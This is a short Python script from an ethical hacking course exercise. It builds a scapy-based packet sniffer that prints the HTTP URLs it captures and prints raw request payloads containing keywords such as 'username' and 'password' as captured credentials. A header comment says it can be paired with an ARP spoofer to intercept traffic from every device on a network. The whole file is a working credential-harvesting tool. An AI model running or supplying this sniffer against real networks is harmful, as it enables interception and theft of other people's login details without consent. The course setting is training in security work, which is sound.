#!/usr/bin/env python

##########################################################################################################
#
# Author: Brenyn Kissoondath
# Course: Learn Python and Ethical Hacking From Scratch - StationX
# Instructor: Zaid Al Quraishi
# Purpose: Create a packet sniffer
# Input(s): Device to sniff
# Output(s): Filters out relevant data
#
# Notes to self: Can be used with arp spoofer to read from all devices on a network (man in the middle)
#
##########################################################################################################

import scapy.all as scapy
from scapy.layers import http #allows us to use http filters

def sniff(interface):
	scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
	if packet.haslayer(scapy.Raw):
		load = (packet[scapy.Raw].load) # only print from load inside of raw layer
		keywords = ["username", "Username","user", "login", "password", "pass","Password"]
		for keyword in keywords:
			if keyword in load:
				return load

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		#print(packet.show()) #show all fields in the packet
		url = get_url(packet)
		print(url)
		login_info = get_login(packet)
		if login_info:
			print("\n\n[+] Potential username/password:    " + login_info + "\n\n")


sniff("eth0")